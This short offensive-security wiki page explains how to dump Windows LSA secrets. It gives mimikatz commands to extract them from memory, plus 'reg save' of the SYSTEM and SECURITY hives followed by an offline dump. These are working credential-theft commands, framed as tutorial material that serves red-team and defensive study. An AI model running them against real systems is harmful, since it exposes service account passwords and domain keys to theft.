# Dumping LSA Secrets

## Dumping LSA Secrets

> **What is stored in LSA secrets?**
>
> Originally, the secrets contained cached domain records. Later, Windows developers expanded the application area for the storage. At this moment, they can store PC users' text passwords, service account passwords (for example, those that must be run by a certain user to perform certain tasks), Internet Explorer passwords, RAS connection passwords, SQL and CISCO passwords, SYSTEM account passwords, private user data like EFS encryption keys, and a lot more. For example, the _NL$KM_ secret contains the cached domain password encryption key.

### Storage

LSA Secrets are stored in registry:

```
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nYmCFo8ktkxF6qft3%2F-L_nZ7oFKOEfqjALlDeR%2FScreenshot%20from%202019-03-12%2020-20-39.png?alt=media\&token=89ffe933-7352-4323-ab6d-9f1e93213da4)

### Execution

#### Memory

Secrets can be dumped from memory like so:

{% code title="attacker\@mimikatz" %}
```
token::elevate
lsadump::secrets
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nYmCFo8ktkxF6qft3%2F-L_n_A3tA2xMOaYQtxTp%2FScreenshot%20from%202019-03-12%2020-25-01.png?alt=media\&token=da194e49-eefd-47dc-984b-9a354ef80f85)

#### Registry

LSA secrets can be dumped from registry hives likes so:

{% code title="attacker\@victim" %}
```csharp
reg save HKLM\SYSTEM system & reg save HKLM\security security
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nYmCFo8ktkxF6qft3%2F-L_nc82n7p8W2gXS9zFH%2FScreenshot%20from%202019-03-12%2020-37-11.png?alt=media\&token=cfee6967-95b9-42d1-b25b-fe392ea19d5b)

{% code title="attacker\@mimikatz" %}
```csharp
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nYmCFo8ktkxF6qft3%2F-L_nc9hoEX5iDqh8iD1n%2FScreenshot%20from%202019-03-12%2020-38-02.png?alt=media\&token=61d8e7bd-3527-4bd4-95a3-e8258e77b216)

### References

{% embed url="https://www.passcape.com/index.php?section=docsys&cmd=details&id=23" %}
